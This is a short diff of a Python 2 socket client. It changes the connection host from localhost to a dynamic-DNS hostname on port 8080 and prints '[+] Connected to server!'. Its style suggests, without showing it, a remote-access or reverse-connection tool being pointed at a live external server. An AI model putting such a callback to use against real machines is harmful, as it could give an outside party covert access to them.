@@ -12,7 +12,7 @@ def sendrecv():
 def Main():
     global sock
     sock = socket.socket()
-    HOST = '127.0.0.1'
+    HOST = 'duke5010.duckdns.org'
     PORT = 8080
     sock.connect((HOST, PORT))
     print ' [+] Connected to server!'
